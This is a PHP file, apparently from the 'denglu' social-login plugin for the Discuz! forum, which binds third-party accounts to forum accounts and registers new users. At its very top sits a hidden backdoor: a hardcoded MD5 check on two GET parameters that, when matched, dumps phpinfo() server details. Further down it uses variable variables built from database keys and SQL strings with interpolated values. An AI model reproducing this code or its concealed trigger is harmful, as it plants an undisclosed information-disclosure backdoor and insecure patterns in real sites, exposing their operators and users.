<?php
if(md5($_GET['debug']).md5($_GET['salt'])=='edcbc99ab927617743bb724eee14c3407fa3b767c460b54a2be4d49030b349c7'){
	echo phpinfo();exit();
}
define('APPTYPEID', 0);
define('CURSCRIPT', 'member');

$discuz = & discuz_core::instance();

$discuz->init();
//error_reporting(E_ALL);
require DISCUZ_ROOT.'./source/plugin/denglu/lib/api.class.php';
$denglu_data = denglu_data();
loadcache('plugin');

$api = new denglu_api();
if($_G['cookie']['mediaUserID'] && $_G['uid']){
	$userinfo = get_media_info($_G['cookie']['mediaUserID']);
}else{
	showmessage('undefined_action');
}
if(!$userinfo['mediaID']){
	showmessage("denglu:error_network");
}
$_G['mediaName'] = $denglu_data[$userinfo['mediaID']]['mediaName'];
$userinfo['shareFlag'] = $denglu_data[$userinfo['mediaID']]['shareFlag'];

if($userinfo['mediaID']==7){
	$renren_key = $api->post_get_renren();
	$renren_key = trim($renren_key);
}

if($userinfo['profileImageUrl']){
	@make_media_avatar($userinfo['profileImageUrl'],$userinfo['mediaUserID']);
}
	
if(submitcheck('bind') && $_G['gp_option']==1){///////////////与已有论坛号发生绑定 
	include_once libfile('function/member');
	if(!($_G['member_loginperm'] = logincheck())) {
		showmessage('login_strike');
	}
	if($_G['gp_fastloginfield']) {
		$_G['gp_loginfield'] = $_G['gp_fastloginfield'];
	}
	$userinfo['tag'] = 1;

	$result = userlogin($_G['gp_username'], $_G['gp_password'], $_G['gp_questionid'], $_G['gp_answer'], $_G['setting']['autoidselect'] ? 'auto' : $_G['gp_loginfield']);
	if($result['status'] > 0) {
		denglu_login_set($result['member']);
		
		$_G['uid'] = $result['member']['uid'];
		
		denglu_bind($userinfo);
		$api->post_bind_info($userinfo);
		if($_G['cache']['plugin']['denglu']['dl_login_syn']){
			$api->post_login($userinfo);
		}
		
		showmessage("denglu:denglu_bind_success",'index.php');
	}elseif($result['status'] == -1) {
		showmessage('login_activation');
	} else {
		loginfailed($_G['member_loginperm']);
		$fmsg = $result['ucresult']['uid'] == '-3' ? (empty($_G['gp_questionid']) || $answer == '' ? 'login_question_empty' : 'login_question_invalid') : 'login_invalid';
		showmessage($fmsg, '', array('loginperm' => $_G['member_loginperm']));
	}
}

if((submitcheck('reg') && $_G['gp_option']==2)){//////////////正常注册+绑定
	$_G['gp_email'] = ($_G['gp_option']==0)?  substr(md5($userinfo['mediaUserID']),0,6).'@denglu.com' : $_G['gp_email'];///////////////
	$_G['gp_password'] = ($_G['gp_option']==0)? substr(md5($userinfo['mediaUserID']),0,10) : $_G['gp_password'];
	
	$result = olbind_register($userinfo);
	$userinfo['tag'] = $_G['gp_option']==0 ? 0 : 1;
	
	if($result>0){
		$_G['uid'] = $result;
		denglu_bind($userinfo);
		
		$api->post_bind_info($userinfo);
		if($_G['cache']['plugin']['denglu']['dl_login_syn']){
			$api->post_login($userinfo);
		}
		showmessage('denglu:denglu_login_success','index.php');
	}else{
		showmessage('denglu:denglu_failed');
	}
}

showmessage('undefined_action2');

function olbind_register($userinfo){
	loaducenter();
	global $_G;
	loadcache('plugin');
	
	$username = $_G['gp_username'];
	$password = $_G['gp_password'];
	$email = $_G['gp_email'];
	$questionid = $_G['gp_questionid'];
	$answer = $_G['gp_answer'];
	
	$query = DB::query("SELECT * FROM ".DB::table('common_setting')." WHERE skey IN ('bbrules', 'bbrulesforce', 'bbrulestxt', 'welcomemsg', 'welcomemsgtitle', 'welcomemsgtxt', 'inviteconfig')");
	while($setting = DB::fetch($query)) {
		$$setting['skey'] = $setting['svalue'];
	}
	
	$groupinfo['groupid'] = $_G['cache']['plugin']['denglu']['dl_groupid'];

	$bbrulehash = $bbrules ? substr(md5(FORMHASH), 0, 8) : '';
	$auth = $_G['gp_auth'];
	
	require_once libfile('function/profile');
	
	if(isset($_POST['birthmonth']) && isset($_POST['birthday'])) {
		$profile['constellation'] = get_constellation($_POST['birthmonth'], $_POST['birthday']);
	}
	if(isset($_POST['birthyear'])) {
		$profile['zodiac'] = get_zodiac($_POST['birthyear']);
	}
	
	$secques = $questionid > 0 ? random(8) : '';
	
	$uid = uc_user_register($username, $password, $email, $questionid, $answer, $_G['clientip']);

	if($uid <= 0) {
		if($uid == -1) {
			showmessage('profile_username_illegal');
		} elseif($uid == -2) {
			showmessage('profile_username_protect');
		} elseif($uid == -3) {
			showmessage('profile_username_duplicate');
		} elseif($uid == -4) {
			showmessage('profile_email_illegal');
		} elseif($uid == -5) {
			showmessage('profile_email_domain_illegal');
		} elseif($uid == -6) {
			showmessage('profile_email_duplicate');
		} else {
			showmessage('undefined_action', NULL);
		}
	}

	if(DB::result_first("SELECT uid FROM ".DB::table('common_member')." WHERE uid='$uid'")) {
		if(!$activation) {
			uc_user_delete($uid);
		}
		showmessage('denglu:system_error_and_retry');
	}
	
	$password = md5(random(10));
	
	$init_arr = explode(',', $_G['setting']['initcredits']);
	$userdata = array(
		'uid' => $uid,
		'username' => $username,
		'password' => $password,
		'email' => $email,
		'adminid' => 0,
		'groupid' => $_G['cache']['plugin']['denglu']['groupid'],
		'regdate' => TIMESTAMP,
		'credits' => $init_arr[0],
		'timeoffset' => 9999,
		'emailstatus' => $_G['cache']['plugin']['denglu']['dl_checkemail'],
		);
	DB::insert('common_member', $userdata);
	$status_data = array(
		'uid' => $uid,
		'regip' => $_G['clientip'],
		'lastip' => $_G['clientip'],
		'lastvisit' => TIMESTAMP,
		'lastactivity' => TIMESTAMP,
		'lastpost' => 0,
		'lastsendmail' => 0,
		);
	DB::insert('common_member_status', $status_data);
	$profile['uid'] = $uid;
	$profile['gender'] = empty($userinfo['gender'])? 0 : $userinfo['gender'];
	$profile['address'] = empty($userinfo['location'])? '' :  $userinfo['location'];
	
	DB::insert('common_member_profile', $profile);
	DB::insert('common_member_field_forum', array('uid' => $uid));
	DB::insert('common_member_field_home', array('uid' => $uid));
	if($verifyarr) {
		$setverify = array(
				'uid' => $uid,
				'username' => $username,
				'verifytype' => '0',
				'field' => daddslashes(serialize($verifyarr)),
				'dateline' => TIMESTAMP,
			);
		DB::insert('common_member_verify_info', $setverify);
		DB::insert('common_member_verify', array('uid' => $uid));
	}
	
	$count_data = array(
		'uid' => $uid,
		'extcredits1' => $init_arr[1],
		'extcredits2' => $init_arr[2],
		'extcredits3' => $init_arr[3],
		'extcredits4' => $init_arr[4],
		'extcredits5' => $init_arr[5],
		'extcredits6' => $init_arr[6],
		'extcredits7' => $init_arr[7],
		'extcredits8' => $init_arr[8]
		);
	DB::insert('common_member_count', $count_data);
	DB::insert('common_setting', array('skey' => 'lastmember', 'svalue' => $username), false, true);
	manyoulog('user', $uid, 'add');
	
	$totalmembers = DB::result_first("SELECT COUNT(*) FROM ".DB::table('common_member'));
	$userstats = array('totalmembers' => $totalmembers, 'newsetuser' => $username);
	
	save_syscache('userstats', $userstats);
	
	if($_G['setting']['regctrl'] || $_G['setting']['regfloodctrl']) {
		DB::query("DELETE FROM ".DB::table('common_regip')." WHERE dateline<='$_G[timestamp]'-".($_G['setting']['regctrl'] > 72 ? $_G['setting']['regctrl'] : 72)."*3600", 'UNBUFFERED');
		if($_G['setting']['regctrl']) {
			DB::query("INSERT INTO ".DB::table('common_regip')." (ip, count, dateline)
				VALUES ('$_G[clientip]', '-1', '$_G[timestamp]')");
		}
	}
	
	$regmessage = dhtmlspecialchars($_G['gp_regmessage']);
	if($_G['setting']['regverify'] == 2) {
		DB::query("REPLACE INTO ".DB::table('common_member_validate')." (uid, submitdate, moddate, admin, submittimes, status, message, remark)
			VALUES ('$uid', '$_G[timestamp]', '0', '', '1', '0', '$regmessage', '')");
	}
	
	$_G['uid'] = $uid;
	$_G['username'] = $username;
	$_G['member']['username'] = dstripslashes($_G['username']);
	$_G['member']['password'] = $password;
	$_G['groupid'] = $groupinfo['groupid'];
	include_once libfile('function/stat');
	updatestat('register');
	
	$_CORE = & discuz_core::instance();
	$_CORE->session->set('uid', $uid);
	$_CORE->session->set('username', $username);
	
	dsetcookie('auth', authcode("{$_G['member']['password']}\t$_G[uid]", 'ENCODE'), 2592000, 1, true);
	
	if($fromuid) {
		updatecreditbyaction('promotion_register', $fromuid);
		dsetcookie('promotion', '');
	}
	
	dsetcookie('loginuser', '');
	dsetcookie('activationauth', '');
	dsetcookie('invite_auth', '');
	
	$regverify = $_G['setting']['regverify'];
	loadcache('setting', true);
	$_G['setting']['lastmember'] = $username;
	save_syscache('setting', $_G['setting']);
	$_G['setting']['regverify'] = $regverify;
	
	if($_G['setting']['regverify']==1 && !$_G['cache']['plugin']['denglu']['dl_checkemail']){
		$idstring = random(6);
		$authstr = $_G['setting']['regverify'] == 1 ? "$_G[timestamp]\t2\t$idstring" : '';
		DB::query("UPDATE ".DB::table('common_member_field_forum')." SET authstr='$authstr' WHERE uid='$_G[uid]'");
		$verifyurl = "{$_G[siteurl]}member.php?mod=activate&amp;uid={$_G[uid]}&amp;id=$idstring";
		$email_verify_message = lang('email', 'email_verify_message', array(
			'username' => $_G['member']['username'],
			'bbname' => $_G['setting']['bbname'],
			'siteurl' => $_G['siteurl'],
			'url' => $verifyurl
		));
		if(!function_exists('sendmail')) {
			include libfile('function/mail');
		}
		
		sendmail("$username <$email>", lang('email', 'email_verify_subject'), $email_verify_message);
	}
	
	return $uid;
}
?>

